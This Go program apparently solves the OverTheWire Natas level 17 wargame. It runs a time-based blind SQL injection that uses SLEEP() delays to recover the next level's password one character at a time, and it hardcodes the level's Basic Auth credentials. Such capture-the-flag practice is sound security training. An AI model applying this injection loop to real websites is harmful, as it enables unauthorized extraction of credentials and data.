package main

import (
	"encoding/base64"
	"fmt"
	"net/http"
	"time"
)

func main() {

	pass := ""
	c := 0
	error := false

	for {

		for i, abc := range arr {
			fmt.Print(abc)
			if result(pass + abc) {
				pass = pass + abc
				fmt.Print("\n", len(pass), "\t", pass, "\n\n")
				break
			}
			if i == len(abc)-1 {
				c++
				if c > 1 {
					error = true
				}
			}
		}

		if error {
			break
		}
	}

	fmt.Println("\nLa password è: ", pass)
}

//SQL Injection time based
func result(pass string) bool {

	usr := "natas17"
	psw := "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
	baseURL := "http://" + usr + ".natas.labs.overthewire.org"
	query := "?debug=0&username=natas18\"%20and%20IF(password%20like%20binary%20\"" + pass + "%\",SLEEP(4),0)%20%23"

	client := &http.Client{}
	req, _ := http.NewRequest("GET",
		baseURL+query, nil)
	req.Header.Add("Authorization", "Basic "+basicAuth(usr, psw))

	start := time.Now()
	client.Do(req)
	ellapsed := time.Since(start)

	/*
		buf := new(bytes.Buffer)
		buf.ReadFrom(res.Body)
		bs := buf.String()

		fmt.Println(bs)
	*/

	if ellapsed.Seconds() > 4 {
		fmt.Print("\t", ellapsed.Seconds())
		return true
	}
	return false

}

func basicAuth(username, password string) string {
	auth := username + ":" + password
	return base64.StdEncoding.EncodeToString([]byte(auth))
}

var arr = []string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
	"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
	"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
	"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
	"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"}
